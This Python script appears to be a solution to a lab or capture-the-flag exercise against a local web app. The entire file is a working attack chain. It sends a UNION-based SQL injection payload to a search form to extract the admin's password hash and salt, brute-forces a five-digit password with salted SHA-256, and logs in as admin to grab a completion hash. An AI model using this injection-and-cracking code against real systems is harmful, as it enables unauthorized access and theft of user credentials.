import requests
import hashlib
import re

# Gets the admin hash + salt from SQL database
def get_admin_hash_and_salt():
    target_url = "http://localhost:8080/search"
    
    payload = "\" UNION SELECT password_hash || ':' || password_salt FROM members WHERE username='admin'--"
    data = {"name": payload}
    
    try:
        response = requests.post(target_url, data=data)
        
        # Look for the hash:salt pattern in the response
        hash_salt_pattern = r'([a-f0-9]{64}):([a-z]{2})'
        match = re.search(hash_salt_pattern, response.text)
        
        if match:
            admin_hash = match.group(1)
            admin_salt = match.group(2)
            print(f"Admin hash: {admin_hash}")
            print(f"Admin salt: {admin_salt}")
            return admin_hash, admin_salt
        else:
            print("Could not properly interpret search output")
            return None, None
            
    except Exception as e:
        print(f"{e}")
        return None, None

# Brute force the pswd
def brute_force_password(target_hash, salt):    
    for i in range(0, 100000):
        password = f"{i:05d}"  # Format as 5-digit number
        
        # Compute SHA256(salt + password)
        candidate = salt + password
        candidate_hash = hashlib.sha256(candidate.encode()).hexdigest()
        
        if candidate_hash == target_hash:
            print(f"pswd: {password}")
            return password
            
    print("pswd wasn't found")
    return None

# Login user as admin w/ found pswd
def login_as_admin(password):
    login_url = "http://localhost:8080/login"
    name = "om khadka"
    
    login_data = {
        "username": "admin",
        "name": name,
        "password": password
    }
    
    try:
        response = requests.post(login_url, data=login_data)
        
        if "ACCESS GRANTED" in response.text:            
            hash_match = re.search(r'<h2>([a-f0-9]{64})</h2>', response.text)
            if hash_match:
                access_hash = hash_match.group(1)
                print(f"Completion Hash: {access_hash}")
                return access_hash
        else:
            print("Login failed")
            return None
            
    except Exception as e:
        print(f"{e}")
        return None

def main():
    admin_hash, admin_salt = get_admin_hash_and_salt()
    
    if not admin_hash or not admin_salt:
        print("failed to get admin hash")
        return
    
    password = brute_force_password(admin_hash, admin_salt)
    
    if not password:
        print("Failed to find password")
        return
    
    completion_hash = login_as_admin(password)
    
    if completion_hash:
        print("attack worked")
        print(f"Admin true pswd: {password}")
        print(f"Salt: {admin_salt}")
        print(f"Completion Hash: {completion_hash}")
    else:
        print("Login failed")

if __name__ == "__main__":
    main()